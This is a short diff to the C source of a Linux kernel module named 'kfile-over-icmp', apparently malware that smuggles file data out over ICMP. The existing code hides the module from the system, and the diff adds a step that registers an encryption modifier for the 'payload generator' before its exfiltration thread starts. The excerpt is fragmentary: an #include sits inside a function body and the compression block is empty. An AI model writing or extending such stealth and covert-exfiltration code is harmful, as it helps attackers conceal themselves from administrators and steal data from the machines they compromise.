@@ -8,12 +8,25 @@
 static const char* input_chrdev_name = "kinput";
 static int input_chrdev_major_num;
 
+void add_payload_generator_modifier_functions(void)
+{
+#ifdef CONFIG_COMPRESS_FILE
+#endif
+
+#ifdef CONFIG_ENCRYPT_FILE
+#include "utils/modifiers/encryptor.h"
+payload_generator_add_modifier(&encrypt_data);
+#endif
+}
+
 int core_start(void)
 {
 #ifdef CONFIG_HIDE_MODULE
     hide_module();
     printk(KERN_DEBUG "kfile-over-icmp: module hidden successfully.\n");
 #endif
+
+    add_payload_generator_modifier_functions();
 
     if (start_payload_generator_thread()) {
         printk(KERN_ERR "kfile-over-icmp: failed to start payload generator thread\n");
